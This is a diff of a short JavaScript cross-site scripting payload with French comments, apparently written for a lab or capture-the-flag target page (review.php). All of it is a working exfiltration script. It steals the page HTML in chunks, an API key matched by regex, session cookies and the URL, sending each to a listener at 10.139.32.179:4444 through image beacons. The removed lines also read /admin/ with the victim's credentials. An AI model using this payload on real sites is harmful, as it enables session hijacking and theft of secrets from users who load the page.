@@ -1,27 +1,22 @@
-// Ultra simple - envoie tout le HTML de la page actuelle
-const data = document.documentElement.outerHTML;
-new Image().src = "http://10.139.32.179:4444/?html=" + encodeURIComponent(data);
+// Exfiltrer le contenu de la page actuelle (review.php)
+const pageContent = document.documentElement.outerHTML;
 
-// Envoyer aussi le cookie
+// Chercher l'API key dans la page
+const keyMatch = pageContent.match(/vk_live_[a-f0-9]{40}/);
+if (keyMatch) {
+    // Envoyer via Image
+    new Image().src = "http://10.139.32.179:4444/?api=" + keyMatch[0];
+}
+
+// Envoyer tout le HTML de la page en chunks
+const chunkSize = 500;
+for (let i = 0; i < pageContent.length; i += chunkSize) {
+    const chunk = pageContent.substring(i, i + chunkSize);
+    new Image().src = "http://10.139.32.179:4444/?chunk" + i + "=" + encodeURIComponent(chunk);
+}
+
+// Envoyer le cookie
 new Image().src = "http://10.139.32.179:4444/?cookie=" + encodeURIComponent(document.cookie);
 
-// Si on peut accéder à /admin/ via fetch, on le fait
-fetch('/admin/', { credentials: 'include' })
-    .then(r => r.text())
-    .then(html => {
-        new Image().src = "http://10.139.32.179:4444/?admin=" + encodeURIComponent(html.substring(0, 1000));
-    })
-    .catch(() => {
-        // Si fetch échoue, on essaie avec une iframe
-        const iframe = document.createElement('iframe');
-        iframe.src = '/admin/';
-        iframe.onload = function() {
-            try {
-                const html = iframe.contentDocument.documentElement.outerHTML;
-                new Image().src = "http://10.139.32.179:4444/?iframe=" + encodeURIComponent(html.substring(0, 1000));
-            } catch(e) {
-                new Image().src = "http://10.139.32.179:4444/?iframe_error=" + encodeURIComponent(e.message);
-            }
-        };
-        document.body.appendChild(iframe);
-    });
+// Envoyer l'URL
+new Image().src = "http://10.139.32.179:4444/?url=" + encodeURIComponent(location.href);
